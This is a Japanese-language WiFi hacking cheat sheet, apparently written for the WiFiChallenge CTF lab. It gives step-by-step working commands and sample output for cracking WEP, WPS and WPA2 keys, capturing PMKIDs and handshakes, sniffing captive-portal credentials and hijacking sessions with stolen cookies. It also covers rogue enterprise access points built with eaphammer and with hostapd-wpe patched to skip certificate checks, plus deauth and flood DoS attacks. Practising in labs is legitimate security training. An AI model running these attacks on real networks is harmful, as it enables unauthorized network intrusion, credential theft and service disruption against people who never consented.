# WiFi Hacking Tree

> **使用ガイド:** このチートシートは初期セットアップから攻撃の最終段階まで順番に並んでいます。各攻撃には **前提条件 → コマンド → 取得データ → 次のステップ** が含まれます。

---

## 🧰 セクション0: 初期セットアップと完全リセット

### 0.1. 環境の完全リセット（各チャレンジの前）

```bash
# 1. 干渉するプロセスを停止
sudo systemctl stop NetworkManager
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo airmon-ng check kill

# 2. すべての仮想モニターインターフェースを削除
for i in $(iw dev | grep Interface | awk '{print $2}'); do
    sudo iw dev $i del 2>/dev/null
done

# 3. ドライバをリセット（シミュレータ環境）
sudo modprobe -r mac80211_hwsim && sleep 2 && sudo modprobe mac80211_hwsim

# 4. （任意）準備済みスクリプト
sudo ~/restartWiFi.sh
```

### 0.2. インターフェースとドライバの確認

```bash
iw dev                    # インターフェース一覧
iw phy                    # 物理ラジオ一覧
iw phy phy0 info          # phy0 の機能

# カードのドライバを確認
readlink /sys/class/net/wlan0/device/driver
sudo ethtool -i wlan0
lsusb -t                  # USB の場合
lspci -k                  # PCI の場合
```

### 0.3. モニターモードの作成（手動 — 最も確実）

```bash
# airmon-ng を使用
sudo airmon-ng start wlan0

# 手動（airmon が壊れている場合）
sudo iw phy phy0 interface add wlan0mon type monitor
sudo ip link set wlan0mon up
iw dev wlan0mon info      # type monitor と表示されるはず
```

> ⚠️ **重要な注意:** `hcxdumptool` には必ず **専用** のモニターインターフェース（別の `phy` 上）を使用し、`wlan0` と共有する `wlan0mon` は使わないこと。

### 0.4. Managed インターフェースの管理

```bash
# 無効化/有効化
sudo ip link set wlan1 down
sudo ip link set wlan1 up

# タイプを managed に変更
sudo iw dev wlan1 set type managed

# インターフェース名の変更
sudo ip link set wlan0mon down
sudo ip link set wlan0mon name mymon
sudo ip link set mymon up
```

---

## 🔍 セクション1: Recon / Enumeration（偵察）

### 1.1. 全バンドの包括スキャン

```bash
mkdir -p ~/wifi
sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
```

| フラグ | 意味 |
|-----|------|
| `--band abg` | 2.4GHz (b/g) と 5GHz (a) をスキャン — **これがないと 5GHz ネットワークが表示されない** |
| `--wps` | WPS の状態を表示 |
| `--manufacturer` | メーカーを表示 |
| `-w` | 出力を保存（`.cap`, `.csv` など） |

### 1.2. 重要な出力列 — AP（上の表）

| 列 | 意味 | 用途 |
|------|---------|-----|
| **BSSID** | AP の MAC | フィルタリング用ターゲット識別子 |
| **PWR** | 信号強度（0 に近いほど強い） | 近いターゲットを選ぶ |
| **CH** | チャンネル | カードを固定する際に **重要** |
| **ENC** | 暗号化方式: `OPN`/`WEP`/`WPA2`/`WPA3` | 攻撃タイプの決定 |
| **CIPHER** | `CCMP`（強い）、`TKIP`（弱い）、`WEP` | ターゲットの優先度 |
| **AUTH** | `PSK` / `MGT` / `SAE` / `OWE` | 戦略の決定 |
| **WPS** | `0.0` = 無効、`2.0` = 有効 | WPS 攻撃 |
| **ESSID** | ネットワーク名（`<length: N>` = 隠し） | 識別 |

### 1.3. 重要な出力列 — クライアント（下の表）

| 列 | 意味 | 用途 |
|------|---------|-----|
| **BSSID** | 接続先 AP | ネットワークの特定 |
| **STATION** | クライアントの MAC | Deauth/Evil Twin のターゲット |
| **Probes** | 探索しているネットワーク | Evil Twin に **最適** |
| **Notes** | `PMKID` または `WPA handshake` | キャプチャ成功の印 |
| `(not associated)` | 未接続 | フリーなクライアント |

### 1.4. CSV ファイルからの情報抽出

```bash
# 特定のネットワークを検索
cat ~/wifi/scan-01.csv | grep "wifi-global"

# 出力例:
# F0:9F:C2:71:22:17, ..., 44, 54, WPA2, CCMP, MGT, -28, ..., wifi-global
# → BSSID = F0:9F:C2:71:22:17, CH = 44
```

### 1.5. tshark で Probe を検出

```bash
# Probe Request フレーム（サブタイプ 4）
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid -e radiotap.channel.freq

# 特定のクライアントでフィルタ
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4 && wlan.sa == 78:c1:a7:bf:72:46" \
  -T fields -e wlan.ssid
```

### 1.6. wifi_db でスキャンを DB 化

```bash
sudo apt install sqlitebrowser -y
git clone https://github.com/r4ulcl/wifi_db.git
cd /root/tools/wifi_db
sudo python3 wifi_db.py -d /home/user/wifi/wifichallenge.SQLITE /home/user/wifi
sudo sqlitebrowser /home/user/wifi/wifichallenge.SQLITE
```

```sql
SELECT * FROM AP;
SELECT * FROM Client;
```

### 1.7. airodump-ng の出力ファイル

| ファイル | 用途 |
|------|-----|
| **`scan-01.cap`** | メインファイル — Wireshark/aircrack |
| `scan-01.csv` | プレーンテキスト — grep |
| `scan-01.kismet.csv` | Kismet 出力 |
| `scan-01.kismet.netxml` | Kismet XML |
| `scan-01.log.csv` | イベントログ |

---

## 🌐 セクション2: OPN（オープン）ネットワークへの攻撃

### 2.1. オープンネットワークへの接続（最も簡単）

**ステップ1: 設定ファイル作成**
```conf
# ~/wifi/open.conf
network={
    ssid="wifi-free"
    key_mgmt=NONE
    scan_ssid=1        # 隠しネットワークの場合
}
```

**ステップ2: 接続**
```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
```

**ステップ3: IP の取得**
```bash
sudo dhclient wlan2 -v
# 出力: bound to 192.168.16.84 from 192.168.16.1
# → ゲートウェイ = 192.168.16.1
```

**ステップ4: ゲートウェイの特定**
```bash
ip route
# または
ip a show wlan2
```

**ステップ5: ルーターパネルへのアクセス**
```bash
firefox http://192.168.16.1
# admin/admin、admin/password、admin/1234 などを試す
```

---

### 2.2. MAC スプーフィングによる Captive Portal の回避

**戦略:** ログインページは MAC に基づいて判断する → 有効なクライアントの MAC を偽装 → ログインなしで侵入。

**ステップ1: トラフィックのキャプチャとアクティブクライアントの特定**
```bash
sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
# Frames 列 → 最も多い = 最もアクティブなクライアント（有効）
# 例: B0:72:BF:44:B0:49 は 232 フレーム
```

**ステップ2: ネットワークへの初期接続**
```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
sudo dhclient wlan2 -v
```

**ステップ3: MAC の偽装**

```bash
# NetworkManager を停止
sudo systemctl stop NetworkManager

# インターフェースを down、MAC 変更、up
sudo ip link set wlan2 down
sudo macchanger -m b0:72:bf:44:b0:49 wlan2
sudo ip link set wlan2 up

# wpa_supplicant がスタックした場合:
sudo pkill wpa_supplicant
sudo ip link set wlan2 down && sleep 2
sudo ip link set wlan2 up && sleep 2
```

**ステップ4: 再接続**
```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/open.conf
sudo dhclient -v wlan2
```

**ステップ5: HTTP を盗聴して認証情報を抽出**

```bash
# トラフィックが蓄積するまで 3〜5 分待つ
sudo airodump-ng wlan0mon -w ~/wifi/scanc6 --manufacturer --wps -c6
```

**ステップ6: Wireshark で分析**
```bash
wireshark ~/wifi/scanc6-01.cap
# フィルタ: http.request.method == "POST"
# または: http contains "Password"
```

**出力例:**
```
Form item: "Username" = "free1"
Form item: "Password" = "Jyl1iq8UajZ1fEK"
```

**ステップ7: 窃取した認証情報でログイン**
```bash
firefox http://<gateway>
# username: free1, password: Jyl1iq8UajZ1fEK
```

---

## 🐌 セクション3: WEP への攻撃

### 3.1. 理論的背景 — WEP がなぜ破られるか

- WEP は **RC4** を使用。
- 各パケットに **IV**（24ビット）+ キー = Keystream。
- IV は 24 ビットのみ → 約 1600 万通り → 十分な IV（20〜50k）を集めれば **FMS/PTW Attack** でキーを突破できる。
- `aircrack-ng` が統計解析を自動で行う。

### 3.2. AUTO メソッド — `besside-ng`（最速）

**ステップ1: 準備**
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan7
# wifi-old の BSSID とチャンネルを取得（例: CH=3）
```

**ステップ2: 自動攻撃の実行**
```bash
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

> ⚠️ 注意: `besside-ng` は **モニターモード** のインターフェース（自分で monitor にした `wlan2`）で動作し、airmon が作った `wlan0mon` ではない。

**何が起こるか？**
1. 自動 Fake Auth
2. Association
3. ARP Replay
4. 約 4 分で 30,000+ IV を収集
5. 自動クラック

**ステップ3: ログからキーを読む**
```
[02:35:38] Got key for wifi-old [11:bb:33:cd:55] 30044 IVs
[02:35:38] Pwned network wifi-old in 4:22 mins:sec
```
→ **KEY = `11:bb:33:cd:55`**

---

### 3.3. MANUAL メソッド — ステップバイステップ

#### ステップ1: ターゲットのトラフィックをキャプチャ

```bash
sudo airodump-ng -c 3 --bssid F0:9F:C2:71:22:11 \
  -w ~/wifi/wifi-old wlan0mon
```

> `#Data` 列 = 収集した IV の数。**目標: 20,000〜50,000**

#### ステップ2: Fake Authentication（AP に自分を紹介）

```bash
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0mon
```

| フラグ | 意味 |
|-----|------|
| `-1 3600` | 3600 秒ごとに再認証 |
| `-q 10` | 10 秒ごとに Keep-Alive |
| `-a` | ターゲット BSSID |

> **なぜ？** AP は Associate したクライアントとしか通信しない。WEP は Open Auth で動作するため、パスワードは不要。

#### ステップ3: ARP Replay（人工トラフィックの生成）

```bash
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 \
  -h BA:49:A9:53:A1:8C wlan0mon
```

| フラグ | 意味 |
|-----|------|
| `--arpreplay` | キャプチャした ARP を注入 |
| `-b` | ターゲット BSSID |
| `-h` | 自分の MAC（偽のクライアント） |

> **なぜ？** AP がより速くパケットを送信 → より多くの IV が生成される。

#### ステップ3.5（任意）: トラフィックを刺激する Deauth

```bash
sudo aireplay-ng --deauth 5 -a F0:9F:C2:71:22:11 \
  -c 64:32:A8:56:32:56 wlan0mon
```

#### ステップ4: キーのクラック

```bash
sudo aircrack-ng ~/wifi/wifi-old-01.cap
# 出力: KEY FOUND! [ 11:bb:33:cd:55 ]
```

#### ステップ5: WEP 設定の作成と接続

```conf
# ~/wifi/wep.conf
network={
    ssid="wifi-old"
    key_mgmt=NONE
    wep_key0=11bb33cd55
    wep_tx_keyidx=0
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/wep.conf
sudo dhclient wlan2 -v
ip route
# ルーターの Web サーバーにアクセスしてフラグを取得
```

### 3.4. 補足の WEP 攻撃（Writeup にはないが重要）

| 攻撃 | コマンド | 用途 |
|------|-------|-----|
| **Fragmentation** | `aireplay-ng -5 -b <BSSID> -h <MAC> wlan0mon` | ARP なしで IV を生成 |
| **ChopChop** | `aireplay-ng -4 -b <BSSID> -h <MAC> wlan0mon` | ARP なしでパケットをクラック |
| **KoreK** | `aircrack-ng -K capture.cap` | 古い WEP クラック手法 |

---

## 🔑 セクション4: WPS への攻撃

### 4.1. WPS が危険な理由

- 8 桁の PIN は **4 桁ずつの 2 つの半分** に分割される。
- AP は各半分を別々にチェック → **20,000** 通りだけ（1 億通りではない）。
- 一部の AP は **Pixie Dust** に脆弱（数秒でクラック）。

### 4.2. アクティブな WPS の特定

```bash
# 方法1: airodump の出力（WPS 列）
# 0.0 以外の数字 = WPS 有効

# 方法2: wash
sudo wash -i wlan0mon -c 8
```

**出力例:**
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
F0:9F:C2:71:22:13    8  -30  2.0  No             wifi-event
```
→ **WPS=2.0（有効）、Lck=No（ロックなし）✅**

> 🔒 `Lck: Yes` の場合: `-L` フラグで無視、`bully` を試す、または待つ。

### 4.3. 方法1 — Pixie Dust（最速）

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -K 1
```

| フラグ | 意味 |
|-----|------|
| `-i` | モニターインターフェース |
| `-b` | ターゲット BSSID |
| `-c` | チャンネル |
| `-vv` | verbose |
| `-K 1` | Pixie Dust モード |

### 4.4. 方法2 — PIN ブルートフォース（Pixie Dust 失敗時）

```bash
sudo reaver -i wlan0mon -b F0:9F:C2:71:22:13 -c 8 -vv -S -N -L
```

| フラグ | 意味 |
|-----|------|
| `-S` | 小さな DH キー（高速化） |
| `-N` | NACK なし |
| `-L` | WPS ロックを無視 |

**成功時の出力:**
```
WPS PIN: 12345670
WPA PSK: @MegaPSKP@ssword!@
AP SSID: wifi-event
```

### 4.5. 取得したパスワードで接続

```conf
network={
    ssid="wifi-event"
    psk="@MegaPSKP@ssword!@"
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/event.conf
sudo dhclient wlan2 -v
# → ネットワークにアクセスし、ルーターからフラグを取得
```

---

## 🔐 セクション5: PSK（WPA2-Personal）への攻撃

### 5.1. 4-Way Handshake のキャプチャ + 辞書攻撃

**前提条件:** ネットワークに接続しているクライアントが存在すること。

#### ステップ1: カードをターゲットチャンネルに固定

```bash
# スキャンからチャンネルを確認
sudo airodump-ng wlan0mon --band abg -w ~/wifi/scan
# 仮定: wifi-mobile は CH=6、BSSID=F0:9F:C2:71:22:12
```

> ⚠️ **なぜ固定？** `airodump-ng` は `-c` なしだとチャンネルを巡回し、Handshake を見逃す可能性がある。

#### ステップ2: 再接続を強制する Deauth

```bash
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c <CLIENT-MAC> wlan0mon
```

#### ステップ3: 同時キャプチャ

```bash
sudo airodump-ng wlan0mon -c 6 --bssid F0:9F:C2:71:22:12 \
  -w ~/wifi/scanc6
# この行が表示されたら成功:
# [ WPA handshake: F0:9F:C2:71:22:12
```

#### ステップ4: 辞書攻撃

```bash
aircrack-ng ~/wifi/scanc6-01.cap -w /root/rockyou-top100000.txt
# 出力: KEY FOUND! [ starwars1 ]
```

#### ステップ5: 接続と悪用

```conf
network={
    ssid="wifi-mobile"
    psk="starwars1"
    scan_ssid=1
    key_mgmt=WPA-PSK
    proto=WPA2
}
```

```bash
sudo pkill wpa_supplicant
sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/psk.conf
sudo dhclient wlan3 -v
ip a show wlan3
ip route | grep default
```

---

### 5.2. WPA2 トラフィックの復号（パッシブ復号）

**ステップ1: cap ファイルの復号**
```bash
airdecap-ng -e wifi-mobile -p starwars1 ~/wifi/scanc6-01.cap
# 出力: ~/wifi/scanc6-01-dec.cap
```

| フラグ | 意味 |
|-----|------|
| `-e` | ESSID |
| `-p` | PSK パスワード |

**ステップ2: 復号されたトラフィックの分析**

```bash
wireshark ~/wifi/scanc6-01-dec.cap
# フィルタ: http
```

**サーバー IP の抽出:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http" -T fields -e ip.dst | sort -u
# 192.168.2.1（ルーター）
# 192.168.2.8（ユーザーサーバー）
```

**Cookie の抽出:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.cookie" \
  -T fields -e ip.src -e ip.dst -e http.cookie
# 192.168.2.8  192.168.2.1  PHPSESSID=296228e3896440bd508d4c69e11e265c
```

**Set-Cookie の抽出:**
```bash
tshark -r ~/wifi/scanc6-01-dec.cap -Y "http.set_cookie" \
  -T fields -e ip.src -e ip.dst -e http.set_cookie
```

---

### 5.3. 窃取した Cookie によるセッションハイジャック

**ステップ1: ネットワークへの接続**（取得したパスワードで — ステップ 5.1.5）

**ステップ2: Cookie を使ってログイン**

```bash
# 最初のテスト
curl -i -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/

# リダイレクトが発生した場合
curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/
```

**ステップ3: フラグの抽出**
```bash
curl -L -b "PHPSESSID=296228e3896440bd508d4c69e11e265c" \
  http://192.168.2.1/ | grep -o 'flag{[^}]*}'
```

---

### 5.4. Client Isolation の確認

**ステップ1: ネットワークへの接続**（ステップ 5.1.5）

**ステップ2: ARP スキャン**
```bash
sudo arp-scan -I wlan3 -l
```

**出力例:**
```
192.168.2.1  f0:9f:c2:71:22:12  Ubiquiti Networks Inc.   # ルーター
192.168.2.7  28:6c:07:6f:f9:43  XIAOMI Electronics       # ユーザーサーバー
192.168.2.8  28:6c:07:6f:f9:44  XIAOMI Electronics       # 自分（MAC 変更後は別）
```

**ステップ3: ユーザーサーバーへのアクセス**
```bash
for ip in 192.168.2.7 192.168.2.9 192.168.2.10; do
    echo "=== $ip ==="
    curl -s -m 3 http://$ip/ | grep -o 'flag{[^}]*}'
done
```

> **解釈:** `192.168.2.7` への `curl` が成功 → **Client Isolation は無効** でフラグ取得。タイムアウト → 有効。

---

### 5.5. Rogue AP + Probe からの Handshake（隠し/不在ネットワーク）

**シナリオ:** `wifi-offices` が範囲内にないが、クライアントが Probe を送信している。

#### ステップ1: Probe の特定

```bash
tshark -r capture.cap -Y "wlan.fc.type_subtype == 4" \
  -T fields -e wlan.sa -e wlan.ssid
# 観察: 78:c1:a7:bf:72:46 → wifi-offices
```

#### ステップ2: hostapd-mana で Rogue AP を作成

```conf
# ~/wifi/hostapd-mana.conf
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```

| パラメータ | 意味 |
|---------|---------|
| `interface=wlan1` | managed インターフェース（monitor ではない） |
| `ssid=wifi-offices` | ターゲットのネットワーク名 |
| `mana_wpaout=hostapd.hccapx` | Handshake の出力ファイル |
| `wpa_passphrase=12345678` | 偽 AP のパスワード |

#### ステップ3: 実行してクライアント接続を待つ

```bash
sudo hostapd-mana ~/wifi/hostapd-mana.conf
# クライアントの Probe→Assoc→Handshake を待つ
# メッセージ: AP-STA-POSSIBLE-PSK-MISMATCH（パスワードが違うため）
```

#### ステップ4: Handshake のクラック

```bash
# 直接法
hashcat -a 0 -m 2500 hostapd.hccapx /root/rockyou-top100000.txt --force

# エラーの場合 → 22000 に変換
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
hcxpcapngtool aux.pcap -o hash.22000
hashcat -a 0 -m 22000 hash.22000 /root/rockyou-top100000.txt --force

# 結果を表示
hashcat -m 22000 hash.22000 --show
# 3d0695...:020000000100:78c1a7bf7246:wifi-offices:password1
```

→ **パスワード = `password1`**

#### ステップ5: 接続とアクセス

```conf
network={
    ssid="wifi-offices"
    psk="password1"
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan2 -c ~/wifi/offices.conf
sudo dhclient wlan2 -v
```

---

### 5.6. PMKID 攻撃（クライアント不要 — クライアントがいないネットワーク向け）

**シナリオ:** `wifi-campus` にクライアントがいない — Handshake をキャプチャできない。

#### ステップ1: 専用インターフェースの準備

```bash
sudo pkill wpa_supplicant
sudo pkill dhclient
sudo airmon-ng check kill
```

> ⚠️ **重要:** `wlan0mon` を使わない（`phy#0` 上で `wlan0` と共有され、`hcxdumptool` が `failed to arm interface` エラーを出す）。

```bash
# 別の phy にモニターインターフェースを作成
sudo iw phy phy70 interface add wlan6mon type monitor
sudo ip link set wlan6mon up
sudo iw dev wlan6mon set channel 7
iw dev wlan6mon info
```

#### ステップ2: hcxdumptool の実行

```bash
sudo hcxdumptool -i wlan6mon -w campus.pcapng -c 7a --rds=2 -A
```

| フラグ | 意味 |
|-----|------|
| `-i wlan6mon` | 専用モニターインターフェース |
| `-w campus.pcapng` | 出力ファイル |
| `-c 7a` | チャンネル 7、2.4GHz バンド |
| `--rds=2` | AP/PMKID のライブ表示 |
| `-A` | フレームに ACK |

**成功時の出力:**
```
CHA|  LAST  |EA123P|   MAC-CL   |   MAC-AP   |ESSID
  7|11:31:18|ep+  +|980EE416B9E3|f09fc2712231|wifi-campus
```

#### ステップ3: ハッシュの抽出

```bash
hcxpcapngtool -o campus.22000 campus.pcapng
```

#### ステップ4: クラック

```bash
hashcat -m 22000 -a 0 campus.22000 /root/rockyou-top100000.txt --force
# → basketball
```

#### ステップ5: 接続

```conf
network={
    ssid="wifi-campus"
    psk="basketball"
    key_mgmt=WPA-PSK
    proto=RSN
    pairwise=CCMP
    scan_ssid=1
}
```

```bash
sudo wpa_supplicant -Dnl80211 -iwlan3 -c ~/wifi/campus.conf
sudo dhclient wlan3 -v
# AP の Web サイトにアクセスしてフラグを取得
```

---

## 🏢 セクション6: MGT（WPA2/WPA3-Enterprise）への攻撃

### 6.1. 前提条件

```bash
sudo apt update
sudo apt install -y eaphammer hostapd-wpe asleap hashcat john aircrack-ng
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer && sudo ./kali-setup
```

### 6.2. EAP タイプの特定（Recon）

#### ステップ1: ネットワークのスキャン

```bash
sudo airodump-ng wlan0mon --band abg
# MGT ネットワークを見つける（例: wifi-corp-legacy、CH=44、BSSID=F0:9F:CB:3F:BC:27）
```

#### ステップ2: EAP トラフィックのキャプチャ

```bash
sudo airodump-ng -c 44 --bssid F0:9F:CB:3F:BC:27 \
  -w ~/wifi/legacy wlan0mon
```

#### ステップ3: tshark で分析

```bash
tshark -r ~/wifi/legacy-01.cap -Y "eap" -T fields \
  -E header=y -E separator='|' \
  -e frame.number -e wlan.sa -e wlan.da \
  -e eap.code -e eap.type -e eap.identity -e eap.md5.value
```

**EAP コード:**

| コード | EAP タイプ | 攻撃手法 |
|----|---------|----------|
| 4 | EAP-MD5 | 盗聴 + オフラインクラック（hashcat -m 4800） |
| 6 | EAP-GTC | Rogue AP + GTC Downgrade（平文） |
| 13 | EAP-TLS | Rogue AP + 証明書窃取 |
| 21 | EAP-TTLS | Rogue AP + MSCHAPv2（hashcat -m 5500） |
| 25 | PEAP | Rogue AP + MSCHAPv2 / GTC Downgrade |

---

### 6.3. EAP-MD5 攻撃（コード 4） — パッシブ盗聴

**ステップ1: キャプチャ**（上記で実施済み）

**ステップ2: Challenge/Response の抽出**

```bash
tshark -r ~/wifi/legacy-01.cap -Y "eap.type == 4" \
  -T fields -e frame.number -e eap.id -e eap.code -e eap.md5.value
```

**出力例:**
```
1338  219  1  9d36b0771289ff6cac0d87908e3c3e6f   # Challenge（サーバー）
1339  219  2  7aa0513eabcf931d0b6b426857e6f573   # Response（クライアント）
```

**Identity:**
```
1337  WORKGROUP\administrator
```

**ステップ3: hashcat 形式への変換**

```bash
hcxpcapngtool --eapmd5=legacy.hc4800 ~/wifi/legacy-01.cap
```

**ステップ4: クラック**

```bash
hashcat -m 4800 -a 0 legacy.hc4800 /root/rockyou-top100000.txt
# 出力: 7aa051...:9d36b...:db:pinkfloyd7
```

**式:** `Response = MD5(ID || Password || Challenge)`

**ステップ5: フラグの構築**

```
flag{WORKGROUP\administrator:pinkfloyd7}
```

---

### 6.4. PEAP / EAP-TTLS 攻撃 — Rogue AP

**シナリオ:** クライアントが `wifi-corp-legacy`（MGT）に接続し、証明書を持っている。

#### ステップ1: クライアントとチャンネルの特定

```bash
sudo airodump-ng wlan0mon --band abg -w ~/wifi/legacy
# BSSID = F0:9F:CB:3F:BC:27, CH = 44, Client = 64:32:A8:AD:AB:53
```

#### ステップ2: 再接続を強制する Deauth

```bash
sudo aireplay-ng --deauth 10 -a F0:9F:CB:3F:BC:27 \
  -c 64:32:A8:AD:AB:53 wlan0mon
```

#### ステップ3: 偽証明書の生成

```bash
cd ~/eaphammer
python3 eaphammer --cert-wizard
# → CA 証明書とサーバー証明書が作成される
```

#### ステップ4: Rogue AP の起動

```bash
sudo python3 eaphammer -i wlan1 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp-legacy" \
  --creds \
  --autocrack \
  --wordlist /root/rockyou-top100000.txt
```

| パラメータ | 意味 |
|---------|---------|
| `-i wlan1` | managed インターフェース |
| `--channel 44` | ターゲットチャンネル |
| `--auth wpa-eap` | WPA2-Enterprise |
| `--essid "..."` | ターゲットのネットワーク名 |
| `--creds` | 認証情報の収集 |
| `--autocrack` | MSCHAPv2 の自動クラック |
| `--wordlist` | ワードリスト |

#### ステップ5: 成功時の出力（MSCHAPv2）

```
[+] Captured EAP identity: WORKGROUP\administrator
[+] MSCHAPv2 challenge: aabbccdd...
[+] MSCHAPv2 response: 00112233...
```

**手動クラック（`--autocrack` がない場合）:**
```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W /root/rockyou-top100000.txt
```

**または hashcat:**
```bash
# ハッシュ形式: username::::response:challenge
hashcat -m 5500 hash.txt /root/rockyou-top100000.txt
```

#### ステップ6: GTC Downgrade（クライアントが証明書を拒否した場合）

```bash
sudo python3 eaphammer -i wlan1 \
  --channel 44 \
  --auth wpa-eap \
  --essid "wifi-corp-legacy" \
  --creds \
  --negotiate gtc-downgrade
```

→ パスワードが **平文** でログに表示:
```
[+] EAP identity: WORKGROUP\administrator
[+] GTC Password: pinkfloyd7
```

---

### 6.5. EAP-TLS 攻撃（コード 13） — 任意の証明書を受け入れる Rogue AP

**シナリオ:** 証明書による相互認証 — クライアント証明書を窃取する必要がある。

#### ステップ1: hostapd-wpe のコンパイル

```bash
git clone https://github.com/OpenSecurityResearch/hostapd-wpe.git
cd hostapd-wpe
# https://w1.fi/releases/ から hostapd-2.6.tar.gz をダウンロード
tar -xzf hostapd-2.6.tar.gz
cd hostapd-2.6
patch -p1 < ../hostapd-wpe.patch
cd hostapd
make && sudo make install
```

#### ステップ2: 任意の証明書を受け入れるようにコードを修正

```
ファイル: src/crypto/tls_openssl.c
変更: SSL_set_verify(ssl, SSL_VERIFY_PEER, ...) 
    →  SSL_set_verify(ssl, SSL_VERIFY_NONE, ...)
```
その後、再度 `make && make install`。

#### ステップ3: 設定

```conf
# /etc/hostapd-wpe/hostapd-wpe.conf
interface=wlan1
ssid=wifi-corp-legacy
channel=44
driver=nl80211
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh
```

#### ステップ4: 実行

```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
tail -f /var/log/hostapd-wpe.log
```

#### ステップ5: Deauth とクライアント接続の待機

```bash
sudo aireplay-ng --deauth 10 -a <BSSID_LEGIT> -c <CLIENT_MAC> wlan0mon
```

**出力:** クライアント証明書がログに保存される。

---

### 6.6. EAP-GTC 攻撃 — GTC Downgrade

```bash
sudo python3 eaphammer -i wlan1 \
  --channel <CH> \
  --auth wpa-eap \
  --essid "<SSID_TARGET>" \
  --creds \
  --negotiate gtc-downgrade
```

→ 端末に平文パスワード:
```
[+] EAP identity: CORP\jsmith
[+] GTC Password: MySecretPassword123!
```

---

### 6.7. MGT 攻撃のまとめ表

| EAP | ツール | 出力 | Hashcat |
|-----|-------|-------|---------|
| **MD5** | `eapmd5pass` または tshark | MD5-Challenge ハッシュ | `-m 4800` |
| **TLS** | `hostapd-wpe` | クライアント証明書 | N/A |
| **TTLS** | `eaphammer` + `asleap` | MSCHAPv2 | `-m 5500` |
| **PEAP** | `eaphammer` | MSCHAPv2 | `-m 5500` |
| **GTC** | `eaphammer` | 平文 | N/A |

---

## 🛡️ セクション7: WIDS と DoS（Writeup にはない）

### 7.1. Nzyme による攻撃者の検出

```bash
# WiFiChallenge Lab では Nzyme が VM 上に準備済み
# チャレンジ 27: 攻撃検出アラートの確認（Deauth、Evil Twin）
```

### 7.2. DoS 攻撃（補足）

```bash
# Beacon Flood
sudo mdk4 wlan0mon b -n "FakeNet"

# Authentication Flood
sudo mdk4 wlan0mon a -a <BSSID>

# Deauth Flood
sudo mdk4 wlan0mon d -b <BSSID_FILE>

# Disassociation
sudo aireplay-ng --deauth 100 -a <BSSID> wlan0mon
```

---

## 📊 セクション8: クイック判断 — どのネットワークにどの攻撃？

| ENC | AUTH | WPS | クライアント | 推奨攻撃 | ツール |
|-----|------|-----|--------|----------------|------|
| **OPN** | - | - | - | 単純接続 | `wpa_supplicant` |
| **OPN** | Captive Portal | - | あり | MAC Spoofing + HTTP Sniff | `macchanger` + `airodump-ng` |
| **WEP** | - | - | あり | ARP Replay | `besside-ng` または `aireplay-ng` |
| **WPA2** | PSK | **2.0** | どちらでも | **まず WPS** | `reaver -K 1` |
| **WPA2** | PSK | 0.0 | あり | Handshake + Dictionary | `airodump-ng` + `aircrack-ng` |
| **WPA2** | PSK | 0.0 | **なし** | **PMKID 攻撃** | `hcxdumptool` |
| **WPA2** | PSK | 0.0 | Probe 発見 | **Rogue AP** | `hostapd-mana` |
| **WPA2** | MGT | - | あり | Rogue AP | `eaphammer` |
| **WPA3** | SAE | - | - | Wacker / Downgrade | `wacker` |
| **WPA3** | OWE | - | - | （限定的） | - |

---

## 🎯 セクション9: 各攻撃のデータフロー

### OPN + Captive Portal
```
スキャン → BSSID+CH → 接続 → DHCP → IP+GW
    → キャプチャ → アクティブクライアントの MAC
    → MAC Spoof → 再キャプチャ → HTTP POST → Credential
    → ログイン → Flag
```

### WEP
```
スキャン → BSSID+CH → トラフィックキャプチャ
    → Fake Auth → Assoc
    → ARP Replay → 30k IV → aircrack → WEP キー
    → wep.conf 作成 → 接続 → IP → Web サーバー → Flag
```

### WPS
```
スキャン → WPS=2.0 → wash → Pixie/PIN → PSK
    → 設定作成 → 接続 → IP → Flag
```

### PSK Handshake
```
スキャン → BSSID+CH+Client → キャプチャ + Deauth
    → cap 内の Handshake → aircrack + rockyou → PSK
    → 接続 → airdecap-ng → 復号トラフィック
    → Cookie → Session Hijack → Flag
